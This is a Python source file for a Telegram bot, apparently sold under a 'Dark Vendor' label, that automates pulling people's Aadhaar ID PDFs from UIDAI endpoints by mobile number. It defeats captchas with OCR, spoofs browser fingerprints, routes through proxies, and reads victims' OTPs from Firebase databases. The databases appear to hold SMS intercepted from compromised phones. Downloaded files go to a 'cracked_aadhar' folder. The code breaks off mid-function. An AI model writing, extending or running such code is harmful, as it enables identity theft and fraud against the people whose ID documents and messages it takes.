import asyncio
import os
import re
import subprocess
import base64
import ddddocr
import random
import uuid
import sys
import json
import aiohttp
import warnings
import logging as _logging
import requests as _requests
import threading as _threading
from dotenv import load_dotenv
import time
import stats_manager

load_dotenv()
os.environ['PYTHONIOENCODING'] = 'utf-8'

# Silence noisy charset_normalizer / pkg_resources warnings
warnings.filterwarnings("ignore")
_logging.getLogger("charset_normalizer").setLevel(_logging.ERROR)
_logging.getLogger("urllib3").setLevel(_logging.ERROR)

DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')

# ==============================================================================
# 🎯 AUTO PIPELINE CONFIG — MATCHED TO aad.py
# ==============================================================================
AUTO_PARALLEL_WORKERS = 1        # STRICTLY 1 — one phone at a time
EID_OTP_TIMEOUT = 60              # 1st OTP wait window (same as aad.py)
PDF_OTP_TIMEOUT = 60              # 2nd OTP wait window (same as aad.py)
OTP_FALLBACK_TIMEOUT = 0          # no extra wait
INTER_PHONE_DELAY = 2             # seconds between phones

# ---- TEMPORARY VERSION PROBE (remove after confirming on Railway) ----
print("=" * 60, flush=True)
print(f"[VERSION] aadhaar_engine loaded from: {__file__}", flush=True)
print(f"[VERSION] EID_OTP_TIMEOUT = {EID_OTP_TIMEOUT}", flush=True)
print(f"[VERSION] PDF_OTP_TIMEOUT = {PDF_OTP_TIMEOUT}", flush=True)
print(f"[VERSION] OTP_FALLBACK_TIMEOUT = {OTP_FALLBACK_TIMEOUT}", flush=True)
print(f"[VERSION] AUTO_PARALLEL_WORKERS = {AUTO_PARALLEL_WORKERS}", flush=True)
print(f"[VERSION] MODE = DIRECT UIDAI (no subprocess for /auto)", flush=True)
print("=" * 60, flush=True)


def escape_html(s):
    return str(s or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')


# ==============================================================================
# 🧹 STDERR NOISE FILTER + ERROR CLASSIFIER
# ==============================================================================
_STDERR_NOISE = (
    "charset_normalizer", "charset-normalizer",
    "Extension modules", "requests.packages",
    "pkg_resources", "DeprecationWarning",
    "RequestsDependencyWarning", "urllib3",
    "chardet", "CryptographyDeprecationWarning",
)


def _extract_real_error(stderr_str: str) -> str:
    if not stderr_str:
        return ""
    lines = [l.strip() for l in stderr_str.splitlines() if l.strip()]
    meaningful = [l for l in lines if not any(m in l for m in _STDERR_NOISE)]
    if not meaningful:
        return ""
    err_lines = [l for l in meaningful if any(k in l.lower() for k in (
        "error", "fail", "invalid", "mismatch", "no record", "not found",
        "incorrect", "expired", "limit", "difficulties", "captcha",
    ))]
    if err_lines:
        return err_lines[-1]
    return meaningful[-1]


_NON_RETRYABLE_PATTERNS = (
    "no record found",
    "no record",
    "not found",
    "mismatch",
    "validation failed",
    "incorrect details",
    "wrong details",
    "invalid mobile",
    "no such mobile",
    "aadhaar not linked",
    "no aadhaar",
    "record not found",
    "received within",
    "no eid otp",
    "no pdf otp",
)


def _is_non_retryable(err_msg: str) -> bool:
    if not err_msg:
        return False
    e = err_msg.lower()
    return any(p in e for p in _NON_RETRYABLE_PATTERNS)


def get_ui_card(step_num, title, description, target=None, show_tip=True):
    body = ""
    if step_num:
        body += f"📱 <b>STEP {step_num}/4: {title}</b>\n\n"
    else:
        body += f"⭐ <b>{title}</b>\n\n"
    body += f"{description}\n"
    if target:
        body += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        body += f"📱 <b>Target Mobile:</b> <code>{target}</code>\n"
    if show_tip:
        body += ("━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Tip: Send <b>/cancel</b> to abort.</i>")
    else:
        body += "━━━━━━━━━━━━━━━━━━━━━━"
    return body


# ==============================================================================
# GLOBAL STATE
# ==============================================================================
user_page_registry = {}
buffered_inputs = {}
_engine_instance = None
_running_loop = None
active_engines = {}
active_tasks = set()
VISIBLE_MODE = {}
CRACKED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_aadhar")

os.makedirs(CRACKED_DIR, exist_ok=True)

auto_pipelines = {}


# ==============================================================================
# 🔥 DIRECT UIDAI FLOW — ported from aad.py (no subprocess)
# ==============================================================================
_uidai_thread_local = _threading.local()

_UIDAI_BH = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en_IN',
    'Content-Type': 'application/json',
    'Origin': 'https://myaadhaar.uidai.gov.in',
    'Referer': 'https://myaadhaar.uidai.gov.in/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'appid': 'MYAADHAAR',
}

_UIDAI_UA_POOL = [
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="131"', '"Android"'),
    ('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/130.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="130"', '"Android"'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1', '"Safari";v="18"', '"iOS"'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36', '"Google Chrome";v="131"', '"Windows"'),
]
_UIDAI_SCREEN_POOL = ['360x800', '393x873', '412x915', '414x896', '390x844', '375x812', '1920x1080']


def _uidai_fp():
    import random as _r
    ua, ch, pl = _r.choice(_UIDAI_UA_POOL)
    w, h = _r.choice(_UIDAI_SCREEN_POOL).split('x')
    mob = '?1' if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua else '?0'
    return {
        'User-Agent': ua,
        'sec-ch-ua': f'{ch},"Chromium";v="131","Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': mob,
        'sec-ch-ua-platform': pl,
        'viewport-width': w,
        'device-memory': str(_r.choice([2, 4, 8])),
        'dnt': str(_r.choice([0, 1])),
    }


def _uidai_reset_session():
    _uidai_thread_local.sess = None


def _uidai_get_sess():
    sess = getattr(_uidai_thread_local, 'sess', None)
    if sess is None:
        sess = _requests.Session()
        sess.mount('https://', _requests.adapters.HTTPAdapter(
            pool_connections=5, pool_maxsize=5, max_retries=1, pool_block=False))
        try:
            import proxy_loader
            p = proxy_loader.get_random_proxy()
            if p:
                sess.proxies = {'http': p, 'https': p}
                print(f"[UIDAI] Using proxy: ...{p.split('@')[-1]}", flush=True)
        except Exception as e:
            print(f"[UIDAI] Proxy loader failed: {e}", flush=True)
        _uidai_thread_local.sess = sess
    return sess


def _uidai_get_captcha(retries=3):
    """Fetch captcha image + transactionId. Returns (img_bytes, ctxn, tid) or (None,None,None)."""
    for i in range(1, retries + 1):
        tid = str(uuid.uuid4())
        try:
            _uidai_reset_session()
            s = _uidai_get_sess()
            s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
            r = s.post(
                'https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation',
                json={'captchaLength': '6', 'captchaType': '2', 'audioCaptchaRequired': True},
                timeout=45
            )
            if r.status_code != 200:
                continue
            rj = r.json()
            ctxn = rj.get('transactionId')
            cb64 = rj.get('imageBase64')
            if not cb64:
                for k, v in rj.items():
                    if isinstance(v, str) and len(v) > 100:
                        cb64 = v
                        break
            if not cb64:
                continue
            if cb64.startswith('data:image'):
                cb64 = cb64.split(',')[1]
            return base64.b64decode(cb64), ctxn, tid
        except Exception as e:
            print(f"[UIDAI-CAP] attempt {i} error: {e}", flush=True)
            time.sleep(0.5)
    return None, None, None


def _uidai_solve_cap(img_bytes):
    """Solve captcha with beta OCR + PIL preprocessing (matches aad.py)."""
    try:
        import io
        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
        im = Image.open(io.BytesIO(img_bytes))
        if im.mode != 'L':
            im = im.convert('L')
        w, h = im.size
        im = im.resize((w * 2, h * 2), Image.LANCZOS)
        im = im.filter(ImageFilter.MedianFilter(3))
        im = ImageEnhance.Contrast(im).enhance(2.0)
        im = ImageEnhance.Sharpness(im).enhance(2.0)
        im = im.point(lambda p: 255 if p > 140 else 0)
        im = ImageOps.autocontrast(im, cutoff=5)
        buf = io.BytesIO()
        im.save(buf, format='PNG')
        try:
            ocr_beta = ddddocr.DdddOcr(beta=True, show_ad=False)
            r = ocr_beta.classification(buf.getvalue())
            if r and len(r) >= 4:
                r = ''.join(c for c in r if c.isalnum())
                if len(r) >= 4:
                    return r[:6]
        except: pass
        ocr = ddddocr.DdddOcr(show_ad=False)
        r = ocr.classification(img_bytes)
        return (r or '').strip()
    except Exception as e:
        print(f"[UIDAI-OCR] error: {e}", flush=True)
        return ""


def _uidai_send_eid_otp(mob, name, cap, ctxn, tid):
    """POST retrieveuideid to trigger EID OTP. Returns (ok, otpTxnId, error_msg)."""
    _uidai_reset_session()
    s = _uidai_get_sess()
    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {
        'mobileNumber': mob,
        'dob': None,
        'email': None,
        'name': name.upper(),
        'option': 'EID',
        'otp': None,
        'otpTxnId': None,
        'captchaTxnId': ctxn,
        'captcha': cap,
        'resendOtp': False,
    }
    try:
        r = s.post(
            'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
            json=d, timeout=30
        )
        if r.status_code == 200:
            rj = r.json()
            if 'responseData' in rj:
                rd = rj['responseData']
                if rd.get('otpTxnId') and rd.get('status') == "Success":
                    return True, rd['otpTxnId'], None
                return False, None, rd.get('message', 'Error')
            return False, None, 'Bad response'
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


def _uidai_verify_eid(mob, name, otp, otxn, ctxn, cap):
    """Verify OTP → get EID. Returns (ok, eid, name_or_error)."""
    _uidai_reset_session()
    s = _uidai_get_sess()
    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': str(uuid.uuid4())})
    d = {
        'mobileNumber': mob,
        'dob': None,
        'name': name.upper(),
        'email': None,
        'option': 'EID',
        'otp': otp,
        'otpTxnId': otxn,
        'captchaTxnId': ctxn,
        'captcha': cap,
        'resendOtp': False,
    }
    try:
        r = s.post(
            'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
            json=d, timeout=60
        )
        if r.status_code == 200:
            rj = r.json()
            if rj.get('status') in [200, "Success"] and 'responseData' in rj:
                rd = rj['responseData']
                eid = rd.get('eidNumber')
                nm = rd.get('name', name)
                if eid:
                    return True, eid, nm
                return False, None, "No EID in response"
            ed = rj.get('errorDetails')
            if isinstance(ed, dict):
                return False, None, ed.get('messageEnglish', 'Failed')
            return False, None, rj.get('message', 'Failed')
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


def _uidai_send_aadh_otp(eid, cap, ctxn, tid):
    """Send PDF download OTP. Returns (ok, txnId, error)."""
    _uidai_reset_session()
    s = _uidai_get_sess()
    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {
        'eidNumber': eid,
        'idType': 'eid',
        'captchaTxnId': ctxn,
        'captchaValue': cap,
        'transactionId': tid,
        'resendOTP': False,
    }
    try:
        r = s.post(
            'https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp',
            json=d, timeout=45
        )
        if r.status_code == 200:
            rj = r.json()
            txn = rj.get('txnId')
            if txn and rj.get('status') == "Success":
                return True, txn, None
            return False, None, rj.get('message', 'Failed')
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


def _uidai_dl_pdf(eid, otp, otxn, tid):
    """Download encrypted PDF bytes. Returns (ok, path_or_err)."""
    _uidai_reset_session()
    s = _uidai_get_sess()
    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {'eid': eid, 'mask': False, 'otp': str(otp), 'otpTxnId': otxn}
    try:
        r = s.post(
            'https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',
            json=d, timeout=90
        )
    except Exception as e:
        return False, str(e)

    if r.status_code == 200 and (r.content[:4] == b'%PDF' or r.content[:5] == b'%PDF-'):
        fp = os.path.join(CRACKED_DIR, f"aadh_{int(time.time()*1000)}_{random.randint(1000,9999)}.pdf")
        with open(fp, 'wb') as f:
            f.write(r.content)
        return True, fp

    if r.status_code != 200:
        return False, f'HTTP {r.status_code}'

    try:
        rj = r.json()
    except Exception:
        return False, 'non-JSON response'

    def _find_b64_pdf(data, path="root"):
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, str) and len(v) > 100:
                    try:
                        clean = v.split(',', 1)[1] if v.startswith('data:') and ',' in v else v
                        dec = base64.b64decode(clean, validate=False)
                        if dec[:4] == b'%PDF' or dec[:5] == b'%PDF-':
                            return dec
                    except: pass
                if isinstance(v, (dict, list)):
                    found = _find_b64_pdf(v, f"{path}.{k}")
                    if found: return found
        elif isinstance(data, list):
            for i, item in enumerate(data):
                found = _find_b64_pdf(item, f"{path}[{i}]")
                if found: return found
        return None

    pdf_bytes = _find_b64_pdf(rj)
    if pdf_bytes:
        fp = os.path.join(CRACKED_DIR, f"aadh_{int(time.time()*1000)}_{random.randint(1000,9999)}.pdf")
        with open(fp, 'wb') as f:
            f.write(pdf_bytes)
        return True, fp

    err = rj.get('errorDetails') or rj.get('message') or 'no PDF in response'
    if isinstance(err, dict):
        err = err.get('messageEnglish') or err.get('messageLocal') or str(err)[:200]
    return False, str(err)[:200]


# ==============================================================================
# 🔥 FIREBASE HELPERS — matched to aad.py (limitToLast=30)
# ==============================================================================
FIREBASE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase_links.json")

auto_otp_state = {
    "enabled": False,
    "chat_id": None,
    "target_mobile": None,
    "used_otps": set(),
}


def _load_firebase_links():
    if not os.path.exists(FIREBASE_FILE):
        return []
    try:
        with open(FIREBASE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except Exception:
        return []


def _save_firebase_links(links):
    try:
        temp = FIREBASE_FILE + ".tmp"
        with open(temp, "w", encoding="utf-8") as f:
            json.dump(links, f, indent=2, ensure_ascii=False)
        os.replace(temp, FIREBASE_FILE)
    except Exception as e:
        print(f"⚠️ [FIREBASE] Save error: {e}")


def _normalize_url(url):
    url = (url or "").strip()
    if not url:
        return None
    if not url.startswith("http"):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    return url


def _is_valid_firebase_url(url):
    if not url:
        return False
    return any(p in url for p in ("firebaseio.com", "firebasedatabase.app"))


def firebase_add_link(url, added_by):
    url = _normalize_url(url)
    if not url:
        return False, "Invalid URL format."
    if not _is_valid_firebase_url(url):
        return False, "URL must be a Firebase Realtime Database link."
    links = _load_firebase_links()
    for e in links:
        if e.get("url") == url:
            return False, f"Link already exists (added by {e.get('added_by', 'unknown')})."
    links.append({
        "url": url,
        "added_by": str(added_by),
        "added_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "status": "active"
    })
    _save_firebase_links(links)
    return True, f"✅ Added: <code>{url}</code>"


def firebase_remove_link(url_or_all):
    links = _load_firebase_links()
    if not links:
        return 0, "No Firebase links configured."
    if url_or_all.lower() == "all":
        count = len(links)
        _save_firebase_links([])
        return count, f"🗑️ Removed all <b>{count}</b> Firebase link(s)."
    url = _normalize_url(url_or_all)
    new_links = [l for l in links if l.get("url") != url]
    removed = len(links) - len(new_links)
    if removed == 0:
        return 0, f"Link not found: <code>{url}</code>"
    _save_firebase_links(new_links)
    return removed, f"🗑️ Removed: <code>{url}</code>"


def firebase_list_text():
    links = _load_firebase_links()
    if not links:
        return "📭 <b>No Firebase links configured.</b>\n\nUse <code>/addfire URL</code> to add one."
    text = f"🔥 <b>FIREBASE LINKS ({len(links)})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, entry in enumerate(links, 1):
        short = entry.get("url", "").replace("https://", "").replace("http://", "").rstrip("/")
        text += (
            f"{i}. 🔗 <code>{short}</code>\n"
            f"   ├ 📅 {entry.get('added_at', 'N/A')}\n"
            f"   └ 👤 by <code>{entry.get('added_by', 'N/A')}</code>\n\n"
        )
    text += "━━━━━━━━━━━━━━━━━━━━━━"
    return text


async def firebase_get_online_devices(session, url, limit=None):
    try:
        async with session.get(f"{url}clients.json",
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status != 200:
                return []
            data = await r.json() or {}
            online = [cid for cid, cd in data.items()
                      if isinstance(cd, dict) and cd.get("status") is True]
            online.sort()
            if limit is None:
                return online
            return online[:limit]
    except Exception as e:
        print(f"⚠️ [FIREBASE] online-devices error on {url}: {e}")
        return []


async def firebase_get_device_messages(session, url, cid, limit=30):
    """Fetch last N messages. Matches aad.py's limitToLast=30."""
    try:
        fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}'
        async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status != 200:
                return {}
            return await r.json() or {}
    except Exception:
        return {}


def firebase_extract_phone(messages_dict):
    text = str(messages_dict)
    m = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text)
    return m.group(1) if m else None


def firebase_extract_otp(msg_text):
    text = str(msg_text)
    patterns = [
        r'\b(\d{6})\b',
        r'OTP[:\s]+(\d{6})',
        r'(\d{6})\s+is\s+your',
        r'code[:\s]+(\d{6})',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


async def firebase_get_all_keys(session, url, cid):
    try:
        async with session.get(f"{url}messages/{cid}.json?shallow=true",
                               timeout=aiohttp.ClientTimeout(total=6)) as r:
            data = await r.json()
            if isinstance(data, dict):
                return set(data.keys())
    except Exception:
        pass
    return set()


async def firebase_find_phone_map(session, url, limit_devices=None):
    devices = await firebase_get_online_devices(session, url, limit=limit_devices)
    mapping = {}
    seen_phones = set()
    for cid in devices:
        msgs = await firebase_get_device_messages(session, url, cid, limit=30)
        if not msgs:
            continue
        phone = firebase_extract_phone(msgs)
        if phone and phone not in seen_phones:
            seen_phones.add(phone)
            mapping[phone] = cid
    return mapping


async def firebase_wait_for_otp(url, cid, known_keys, timeout=60, interval=3, session=None,
                                 require_keywords=None, exclude_keywords=None):
    own = session is None
    if own:
        session = aiohttp.ClientSession()
    try:
        iterations = max(1, timeout // interval)
        print(f"[OTP-WAIT] start timeout={timeout}s iterations={iterations} cid={cid[:10]}", flush=True)
        for i in range(iterations):
            try:
                fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=30'
                async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    msgs = await r.json() or {}
                if isinstance(msgs, dict):
                    for key, val in msgs.items():
                        if key in known_keys:
                            continue
                        if (url, key) in auto_otp_state["used_otps"]:
                            continue
                        if not isinstance(val, dict):
                            continue
                        txt = str(val.get("body") or val.get("message") or val.get("msg") or "")
                        txt_lower = txt.lower()
                        if require_keywords and not any(k.lower() in txt_lower for k in require_keywords):
                            continue
                        if exclude_keywords and any(k.lower() in txt_lower for k in exclude_keywords):
                            continue
                        otp = firebase_extract_otp(txt)
                        if otp and otp not in ("000000", "123456", "111111", "999999"):
                            print(f"[OTP-WAIT] FOUND otp={otp} after {i+1} iterations", flush=True)
                            return otp, key
            except Exception as e:
                print(f"[OTP-WAIT] iter {i+1} error: {type(e).__name__}: {str(e)[:80]}", flush=True)
            await asyncio.sleep(interval)
        print(f"[OTP-WAIT] TIMEOUT after {iterations} iterations ({timeout}s)", flush=True)
        return None, None
    finally:
        if own:
            await session.close()


async def init_pool(bot_instance):
    global _running_loop
    _running_loop = asyncio.get_running_loop()


# ==============================================================================
# AADHAAR ENGINE
# ==============================================================================
class AadhaarEngine:
    def __init__(self, bot, chat_id=None):
        self.bot = bot
        self.chat_id = str(chat_id) if chat_id else None
        self.ocr = ddddocr.DdddOcr(show_ad=False)
        self.status_msg_id = None
        self._preloader_active = False
        self._preloader_task = None
        self.temp_msg_ids = []
        self._unique_suffix = ""
        self._force_auto_otp = False
        self._force_auto_captcha = False
        self._auto_mode = False
        self._retry_max = 2
        self._bound_url = None
        self._bound_cid = None

    def update_status(self, text):
        if not self.chat_id or self.chat_id == "master":
            return
        footer = f"\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Dev: @{DEVELOPER_USERNAME} | Dark Vendor</i>"
        if self.status_msg_id:
            try:
                self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.status_msg_id,
                                            text=f"{text}{footer}", parse_mode='HTML')
            except: pass
        else:
            try:
                msg = self.bot.send_message(self.chat_id, f"{text}{footer}", parse_mode='HTML')
                self.status_msg_id = msg.message_id
                try:
                    if int(self.chat_id) < 0:
                        self.temp_msg_ids.append(self.status_msg_id)
                except: pass
            except: pass

    def refresh_status_card(self, text):
        if not self.chat_id or self.chat_id == "master":
            return
        if self.status_msg_id:
            try:
                self.bot.delete_message(chat_id=self.chat_id, message_id=self.status_msg_id)
            except: pass
            self.status_msg_id = None
        self.update_status(text)

    def start_preloader(self, base_text):
        self.stop_preloader()
        self._preloader_active = True
        self.preloader_base_text = base_text
        global _running_loop
        target_loop = _running_loop or asyncio.get_event_loop()
        self._preloader_task = target_loop.create_task(self._preloader_loop())

    def stop_preloader(self):
        self._preloader_active = False
        if hasattr(self, '_preloader_task') and self._preloader_task:
            try: self._preloader_task.cancel()
            except: pass
            self._preloader_task = None

    async def _preloader_loop(self):
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        bars = ["▒░░░░░░░░░", "█▒░░░░░░░░", "██▒░░░░░░░", "███▒░░░░░░", "████▒░░░░░",
                "█████▒░░░░", "██████▒░░░", "███████▒░░", "████████▒░", "█████████▒", "██████████"]
        idx = 0
        bar_idx = 0
        direction = 1
        while self._preloader_active:
            try:
                spin = spinner[idx % len(spinner)]
                bar = bars[bar_idx]
                bar_idx += direction
                if bar_idx >= len(bars) or bar_idx < 0:
                    direction *= -1
                    bar_idx += direction
                base_text = getattr(self, 'preloader_base_text', '⏳ Processing...')
                full_text = f"{base_text}\n━━━━━━━━━━━━━━━━━━━━━━\n{spin} <b>{bar}</b>"
                footer = f"\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Dev: @{DEVELOPER_USERNAME} | Dark Vendor</i>"
                if self.status_msg_id:
                    try:
                        self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.status_msg_id,
                                                    text=f"{full_text}{footer}", parse_mode='HTML')
                    except: pass
                idx += 1
                await asyncio.sleep(1.2)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(2)

    async def close(self):
        if self.chat_id == 'master':
            for uid, eng in list(active_engines.items()):
                try: await eng.close()
                except: pass
            active_engines.clear()
            active_tasks.clear()
        try:
            if hasattr(self, 'phase1_process') and self.phase1_process:
                try:
                    self.phase1_process.kill()
                    await asyncio.wait_for(self.phase1_process.wait(), timeout=2)
                except: pass
                self.phase1_process = None
            if hasattr(self, 'phase1_task') and self.phase1_task:
                try: self.phase1_task.cancel()
                except: pass
                self.phase1_task = None
        except: pass

    async def delete_temp_messages(self):
        if not self.chat_id:
            return
        try:
            chat_id_int = int(self.chat_id)
        except ValueError:
            return
        if chat_id_int < 0:
            for msg_id in list(self.temp_msg_ids):
                try:
                    self.bot.delete_message(chat_id=chat_id_int, message_id=msg_id)
                except: pass
            self.temp_msg_ids.clear()

    def start_early_phase1(self, mobile):
        if hasattr(self, 'phase1_process') and self.phase1_process:
            return
        self.phase1_ready = asyncio.Event()
        self.phase1_mobile = mobile
        global _running_loop
        if _running_loop:
            self.phase1_task = _running_loop.create_task(self._early_phase1_loop(mobile))

    async def _early_phase1_loop(self, mobile):
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
            self.phase1_process = await asyncio.create_subprocess_exec(
                sys.executable, '-u', get_eid_script, "WAIT_INPUT", "WAIT_INPUT", mobile,
                stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            while True:
                line_bytes = await self.phase1_process.stdout.readline()
                if not line_bytes:
                    break
                line = line_bytes.decode('utf-8', errors='ignore').strip()
                if "🔑 WAITING_FOR_NAME_DOB" in line:
                    self.phase1_ready.set()
                    break
        except Exception as e:
            print(f"⚠️ [PRE-WARM] {e}")
            if hasattr(self, 'phase1_process') and self.phase1_process:
                try: self.phase1_process.terminate()
                except: pass
                self.phase1_process = None

    async def wait_for_input(self, chat_id, prompt_type, timeout=300):
        str_chat_id = str(chat_id)
        if str_chat_id in buffered_inputs:
            val = buffered_inputs.pop(str_chat_id)
            if val == '__CANCEL__':
                raise Exception("Process cancelled by user.")
            return val
        user_page_registry[str_chat_id] = {'type': prompt_type, 'value': None}
        try:
            for _ in range(timeout):
                if str_chat_id in buffered_inputs:
                    val = buffered_inputs.pop(str_chat_id)
                    if val == '__CANCEL__':
                        raise Exception("Process cancelled by user.")
                    return val
                if user_page_registry.get(str_chat_id) and user_page_registry[str_chat_id]['value'] is not None:
                    val = user_page_registry[str_chat_id]['value']
                    user_page_registry.pop(str_chat_id, None)
                    if val == '__CANCEL__':
                        raise Exception("Process cancelled by user.")
                    return val
                await asyncio.sleep(1)
            raise Exception(f"Timeout waiting for {prompt_type}")
        finally:
            user_page_registry.pop(str_chat_id, None)

    async def _get_firebase_keys_snapshot(self):
        async with aiohttp.ClientSession() as session:
            return await firebase_get_all_keys(session, self._bound_url, self._bound_cid)

    async def _try_firebase_otp(self, target_mobile, timeout=60, phase=1):
        bound_url = getattr(self, "_bound_url", None)
        bound_cid = getattr(self, "_bound_cid", None)
        try:
            async with aiohttp.ClientSession() as session:
                if bound_url and bound_cid:
                    known = await firebase_get_all_keys(session, bound_url, bound_cid)
                    self.update_status(
                        f"🔥 <b>Auto-OTP {'EID' if phase == 1 else 'PDF'}</b>\n"
                        f"📱 <code>{target_mobile}</code>\n"
                        f"⏳ <b>Waiting ({timeout}s)...</b>"
                    )
                    if phase == 1:
                        req, exc = None, ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"]
                    else:
                        req, exc = ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"], None
                    otp, key = await firebase_wait_for_otp(
                        bound_url, bound_cid, known,
                        timeout=timeout, interval=3, session=session,
                        require_keywords=req, exclude_keywords=exc
                    )
                    if otp:
                        auto_otp_state["used_otps"].add((bound_url, key))
                        return otp
                    if OTP_FALLBACK_TIMEOUT > 0:
                        otp, key = await firebase_wait_for_otp(
                            bound_url, bound_cid, known,
                            timeout=OTP_FALLBACK_TIMEOUT, interval=3, session=session
                        )
                        if otp:
                            auto_otp_state["used_otps"].add((bound_url, key))
                            return otp
                    return None
                if not auto_otp_state.get("enabled") and not getattr(self, "_force_auto_otp", False):
                    return None
                links = _load_firebase_links()
                for entry in links:
                    url = entry.get("url")
                    if not url:
                        continue
                    try:
                        mapping = await firebase_find_phone_map(session, url, limit_devices=None)
                        if target_mobile not in mapping:
                            continue
                        cid = mapping[target_mobile]
                        known = await firebase_get_all_keys(session, url, cid)
                        if phase == 1:
                            req, exc = None, ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"]
                        else:
                            req, exc = ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"], None
                        otp, key = await firebase_wait_for_otp(
                            url, cid, known, timeout=timeout, interval=3, session=session,
                            require_keywords=req, exclude_keywords=exc
                        )
                        if otp:
                            auto_otp_state["used_otps"].add((url, key))
                            return otp
                    except Exception:
                        continue
        except Exception as e:
            print(f"⚠️ [AUTO-OTP] {e}")
        return None

    # ==========================================================================
    # 🚀 AUTO PIPELINE — DIRECT UIDAI (no subprocess)
    # ==========================================================================
    async def run_auto_pipeline(self, chat_id, phone, url, cid, idx, total):
        last_err = ""
        for attempt in range(1, self._retry_max + 1):
            try:
                print(f"▶️ [AUTO] #{idx}/{total} {phone} (attempt {attempt})", flush=True)
                await self._auto_single_attempt(chat_id, phone, url, cid, idx, total, attempt)
                return True
            except Exception as e:
                last_err = str(e)
                print(f"❌ [AUTO] #{idx}/{total} {phone} attempt {attempt} failed: {last_err}", flush=True)

                if _is_non_retryable(last_err):
                    self.update_status(
                        f"📱 <b>[{phone}]</b>\n"
                        f"〔 #{idx} ✗ 〕\n"
                        f"❌ <b>No retry (permanent error)</b>\n"
                        f"<code>{escape_html(last_err[:200])}</code>"
                    )
                    try:
                        stats_manager.record_failure()
                        stats_manager.log_error(chat_id, {"username": "auto", "first_name": "auto"},
                                                 f"Auto #{idx} {phone} (non-retryable): {last_err}")
                    except: pass
                    return False

                if attempt < self._retry_max:
                    self.update_status(
                        f"📱 <b>[{phone}]</b>\n"
                        f"〔 #{idx} ✗ attempt {attempt}/{self._retry_max} 〕\n"
                        f"⚠️ {escape_html(last_err[:150])}\n"
                        f"🔄 <i>Retrying in 5s...</i>"
                    )
                    await asyncio.sleep(5)
                    continue
                else:
                    self.update_status(
                        f"📱 <b>[{phone}]</b>\n"
                        f"〔 #{idx} ✗ 〕\n"
                        f"❌ <b>Failed after {self._retry_max} attempts</b>\n"
                        f"<code>{escape_html(last_err[:200])}</code>"
                    )
                    try:
                        stats_manager.record_failure()
                        stats_manager.log_error(chat_id, {"username": "auto", "first_name": "auto"},
                                                 f"Auto #{idx} {phone}: {last_err}")
                    except: pass
                    return False
        return False

    async def _auto_single_attempt(self, chat_id, phone, url, cid, idx, total, attempt):
        self._bound_url = url
        self._bound_cid = cid
        self._force_auto_otp = True
        self._force_auto_captcha = True
        self._auto_mode = True

        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
